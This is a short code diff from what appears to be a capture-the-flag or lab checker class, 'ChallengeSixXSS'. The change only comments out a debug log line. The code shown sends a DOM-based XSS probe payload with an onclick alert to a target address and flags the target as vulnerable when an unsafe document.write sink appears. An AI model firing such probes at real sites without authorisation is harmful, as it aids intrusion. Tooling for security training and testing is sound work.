@@ -16,7 +16,7 @@ class ChallengeSixXSS(Exploit):
 			mission = "?\" onclick=\"alert()\">"
 			server_response = requests.get(f"http://{self.ip_address}/dom_based_xss/{mission}", timeout=3)
 			server_response_text = server_response.text
-			logger.debug(f"Response: {server_response_text}")
+			# logger.debug(f"Response: {server_response_text}")
 			if 'document.write("<a href=" + decodeURIComponent(document.baseURI)' in server_response_text:
 				logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeSixXSS!{BetterLogger.COLOR_END}")
 				return True
